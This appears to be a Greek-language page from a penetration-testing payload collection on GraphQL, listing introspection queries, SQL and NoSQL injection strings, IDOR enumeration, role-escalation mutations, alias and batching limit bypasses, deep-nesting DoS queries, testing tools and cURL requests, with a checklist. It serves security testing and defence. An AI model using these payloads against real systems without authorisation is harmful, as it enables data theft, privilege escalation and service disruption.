# 📊 Οδηγός ελέγχων GraphQL

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../GraphQL-Injection.md) • [🇹🇷 Türkçe Sürüm](GraphQL-Injection.tr.md)

```
 ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗     
██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗██║     
██║  ███╗██████╔╝███████║██████╔╝███████║██║   ██║██║     
██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║██║▄▄ ██║██║     
╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║╚██████╔╝███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚══▀▀═╝ ╚══════╝
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## Πριν ξεκινήσετε

Το **GraphQL** επιτρέπει σε clients να ζητούν συγκεκριμένα πεδία από ένα **schema** (σχήμα). Ένα **query** διαβάζει δεδομένα, ένα **mutation** περιγράφει μεταβολή και ένας **resolver** υλοποιεί την ανάκτηση ή ενέργεια πεδίου. Το **introspection** περιγράφει το ίδιο το schema.

Τα ονόματα τύπων και πεδίων των παραδειγμάτων πρέπει να υπάρχουν στο πραγματικό schema. Η εξουσιοδότηση εξετάζεται ανά πεδίο και αντικείμενο. Η ύπαρξη introspection, aliases ή fragments δεν αποτελεί από μόνη της ευπάθεια. Τα επιμέρους παραδείγματα SQL/NoSQL Injection απαιτούν και ευάλωτη συμπεριφορά στο υποκείμενο σύστημα.

<a id="section-01"></a>

## 🔍 Βασικές έννοιες GraphQL

### Συνήθη σημεία εφαρμογής
```
/graphql
/graphiql
/v1/graphql
/v2/graphql
/api/graphql
/graph
/query
/gql
/playground
```

### Δομή αιτήματος
```graphql
# Ερώτημα ανάγνωσης — query
{
  user(id: 1) {
    name
    email
  }
}

# Με όνομα λειτουργίας
query GetUser {
  user(id: 1) {
    name
  }
}

# Ενέργεια μεταβολής — mutation
mutation {
  createUser(name: "test", email: "test@test.com") {
    id
    name
  }
}
```

---

<a id="section-02"></a>

## 🎯 Ερωτήματα introspection — περιγραφή σχήματος

> **Χρήση introspection:** Η δυνατότητα περιγραφής σχήματος είναι λειτουργία του GraphQL. Η ενεργοποίησή της δεν συνεπάγεται από μόνη της ευπάθεια ή συγκεκριμένη σοβαρότητα. Το πρώτο δείγμα παραλείπει αρκετές λεπτομέρειες τύπων και δεν είναι πλήρης εξαγωγή κάθε στοιχείου schema.


### Επισκόπηση τύπων και πεδίων σχήματος
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### Τύπος query — αρχικά σημεία ερωτημάτων
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### Τύπος mutation — ενέργειες μεταβολής
```graphql
{
  __schema {
    mutationType {
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### Όλοι οι τύποι
```graphql
{
  __schema {
    types {
      name
      kind
      description
    }
  }
}
```

### Λεπτομέρειες συγκεκριμένου τύπου
```graphql
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

---

<a id="section-03"></a>

## 💉 Δοκιμές εισαγωγής μη έμπιστων δεδομένων

### SQL Injection μέσω GraphQL
```graphql
# Στα ορίσματα
{
  user(id: "1' OR '1'='1") {
    name
    email
    password
  }
}

# Βασισμένο σε UNION
{
  user(name: "' UNION SELECT username,password FROM users--") {
    name
  }
}
```

### Εισαγωγή σε ερωτήματα NoSQL

> **Γραμματική και resolver:** Τα GraphQL ονόματα δεν δέχονται αυθαίρετα σύμβολα όπως δολάριο. Το αρχικό παράδειγμα αντικειμένου μέσα στο query δεν είναι γενικά έγκυρη GraphQL σύνταξη. Η ασφαλής μεταφορά συμβολοσειράς δεν σημαίνει ότι ο resolver την ερμηνεύει ως query NoSQL.

```graphql
{
  user(username: "{\"$ne\": null}") {
    name
    email
  }
}

# Ή ως JSON
{
  "query": "{ user(filter: {username: {$ne: \"\"}}) { name email } }"
}
```

### IDOR — μη ασφαλής άμεση αναφορά σε αντικείμενα
```graphql
# Πρόσβαση σε δεδομένα άλλων χρηστών
{
  user(id: 1) { name email password }
}
{
  user(id: 2) { name email password }
}
{
  user(id: 3) { name email password }
}

# Ερώτημα καταγραφής χρηστών
{
  users {
    id
    name
    email
    role
  }
}
```

---

<a id="section-04"></a>

## 🔥 Παράκαμψη ελέγχων εξουσιοδότησης

### Απουσία ελέγχου πρόσβασης σε mutations
```graphql
# Δοκιμή διαχειριστικών ενεργειών ως απλός χρήστης
mutation {
  deleteUser(id: 1) {
    success
  }
}

mutation {
  updateUserRole(id: 1, role: "admin") {
    id
    role
  }
}
```

### Πρόσβαση μέσω εμφωλευμένων ερωτημάτων
```graphql
# Πρόσβαση σε ευαίσθητα δεδομένα μέσω σχέσεων
{
  posts {
    author {
      email
      passwordHash
      adminToken
    }
  }
}

{
  comments {
    user {
      privateMessages {
        content
      }
    }
  }
}
```

### Άντληση πληροφοριών από προτάσεις πεδίων
```graphql
# Αν υπάρχουν προτάσεις, δοκιμή μη έγκυρων ονομάτων πεδίων
{
  user(id: 1) {
    passwor  # Ενδέχεται να προτείνει "password"
  }
}
```

---

<a id="section-05"></a>

## 🚀 Αποκάλυψη πληροφοριών

### Πληροφορίες αποσφαλμάτωσης
```graphql
# Συλλογή πληροφοριών από σφάλματα
{
  __typename
}

# Μη έγκυρο ερώτημα για έλεγχο έκθεσης stack trace
{
  invalid_field_that_doesnt_exist
}
```

### Αναζήτηση ευαίσθητων πεδίων
```graphql
{
  user(id: 1) {
    id
    username
    email
    password
    passwordHash
    token
    apiKey
    secret
    privateKey
    ssn
    creditCard
    internalId
  }
}
```

---

<a id="section-06"></a>

## 🛡️ Παραδείγματα παράκαμψης του πρωτοτύπου και περιορισμοί

### Δοκιμές μέσω aliases — εναλλακτικών ονομάτων
```graphql
# Δοκιμή εφαρμογής ορίων σε aliases
{
  a: user(id: 1) { name }
  b: user(id: 2) { name }
  c: user(id: 3) { name }
  d: user(id: 4) { name }
}
```

### Ομαδοποίηση πολλών ερωτημάτων
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

### Αλλαγές πεζών και κεφαλαίων

> **Τα ονόματα είναι case-sensitive:** USER, User και user είναι διαφορετικά ονόματα. Η αλλαγή πεζών/κεφαλαίων δεν αποτελεί γενική παράκαμψη GraphQL. Βλ. [προδιαγραφή ονομάτων](https://spec.graphql.org/September2025/#sec-Names).

```graphql
# Δοκιμή πεζών και κεφαλαίων
{
  USER(id: 1) { name }
}
{
  User(id: 1) { name }
}
```

### Χρήση fragments — επαναχρησιμοποιούμενων τμημάτων
```graphql
{
  user(id: 1) {
    ...sensitiveData
  }
}

fragment sensitiveData on User {
  password
  apiKey
  token
}
```

---

<a id="section-07"></a>

## 💣 Παραδείγματα άρνησης υπηρεσίας — DoS

### Ερώτημα μεγάλου βάθους
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}
```

### Κυκλικές αναφορές fragments

> **Απαιτούμενη επικύρωση:** Τα fragments δεν επιτρέπεται να σχηματίζουν κύκλους σε συμβατή υλοποίηση. Το δείγμα πρέπει κανονικά να απορρίπτεται κατά την επικύρωση· δεν αποτελεί καθολικό DoS. Βλ. [κανόνας αποφυγής κύκλων](https://spec.graphql.org/September2025/#sec-Fragment-Spreads-Must-Not-Form-Cycles).

```graphql
query {
  user(id: 1) {
    ...A
  }
}

fragment A on User {
  ...B
}

fragment B on User {
  ...A  # Κυκλική αναφορά
}
```

### Πολύ μεγάλο σύνολο αποτελεσμάτων
```graphql
{
  users(first: 999999) {
    id
    name
    email
    posts {
      id
      comments {
        id
      }
    }
  }
}
```

---

<a id="section-08"></a>

## 🛠️ Εργαλεία ελέγχου

### GraphQL Voyager
```bash
# Οπτικοποίηση σχήματος
https://graphql-kit.com/graphql-voyager/
# Επικόλληση αποτελέσματος introspection
```

### InQL — επέκταση Burp
```
# Χαρακτηριστικά:
- Εξαγωγή σχήματος
- Δημιουργία ερωτημάτων
- Έλεγχοι πιθανών ευπαθειών
```

### graphql-cop
```bash
# Εργαλείο ελέγχου ασφάλειας
pip install graphql-cop
graphql-cop -t https://target.com/graphql
```

### graphw00f
```bash
# Αναγνώριση υλοποίησης GraphQL
git clone https://github.com/dolevf/graphw00f
python3 main.py -t https://target.com/graphql
```

### Altair GraphQL Client
```
# Εφαρμογή υπολογιστή για δοκιμές
https://altairgraphql.dev/
```

---

<a id="section-09"></a>

## 📝 Παραδείγματα cURL

### Βασικό ερώτημα
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { name email } }"}'
```

### Με μεταβλητές
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query GetUser($id: Int!) { user(id: $id) { name } }", "variables": {"id": 1}}'
```

### Introspection — περιγραφή σχήματος
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

### Με στοιχεία ταυτοποίησης
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ me { name } }"}'
```

---

<a id="section-10"></a>

## 📋 Λίστα ελέγχου

```markdown
## Λίστα ελέγχου ασφάλειας GraphQL

□ Αναγνώριση σημείων GraphQL
□ Έλεγχος introspection και εξαγωγής σχήματος
□ Καταγραφή διαθέσιμων queries και mutations
□ Έλεγχος IDOR σε ερωτήματα αντικειμένων
□ Έλεγχος εξουσιοδότησης στα mutations
□ Έλεγχος ορισμάτων για SQL/NoSQL injection
□ Έλεγχος εμφωλευμένων ερωτημάτων για διαρροές
□ Έλεγχος ορίων με χρήση aliases
□ Έλεγχος ομαδοποιημένων ερωτημάτων
□ Έλεγχος ευαίσθητων πεδίων: password, token
□ Έλεγχος ορίου βάθους μέσα στα επιτρεπόμενα όρια δοκιμής
□ Έλεγχος έκθεσης πληροφοριών από σφάλματα
□ Έλεγχος σημείων subscription — διαρκών ενημερώσεων
```

---

<a id="section-11"></a>

## 🔗 Συνοπτικός πίνακας αδυναμιών

| Αδυναμία | Δοκιμή | Επίπτωση |
| --------------- | ------ | -------- |
| **Ενεργό introspection** | Ερώτημα `__schema` | Αποκάλυψη σχήματος |
| **IDOR** | Αλλαγή αναγνωριστικών στα ερωτήματα | Πρόσβαση σε δεδομένα άλλων χρηστών |
| **Απουσία ελέγχου πρόσβασης** | Ερώτημα χωρίς token | Μη εξουσιοδοτημένη πρόσβαση |
| **SQLi/NoSQLi** | Εισαγωγή στα ορίσματα | Παραβίαση εμπιστευτικότητας ή ακεραιότητας βάσης |
| **Υπερβολική έκθεση δεδομένων** | Ερώτημα ευαίσθητων πεδίων | Διαρροή δεδομένων |
| **DoS** | Ερωτήματα μεγάλου βάθους ή κυκλικών αναφορών | Μη διαθεσιμότητα υπηρεσίας |
| **Κατάχρηση ομαδοποίησης** | Πολλαπλά ερωτήματα | Ανεπαρκής εφαρμογή ορίου αιτημάτων |

---

<a id="section-12"></a>

## 🔗 Σχετικές συλλογές δοκιμαστικών εισόδων

- [Δοκιμαστικές είσοδοι SQLi](SQLi.el.md)
- [Εισαγωγή σε ερωτήματα NoSQL](NoSQL-Injection.el.md)
- [Ασφάλεια διεπαφών εφαρμογών (API)](../../API-Security/translations/README.el.md)

---

**Επιστροφή στη συλλογή:** [💉 Συλλογή δοκιμαστικών εισόδων στην ελληνική αρχική σελίδα](../../README.el.md)

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
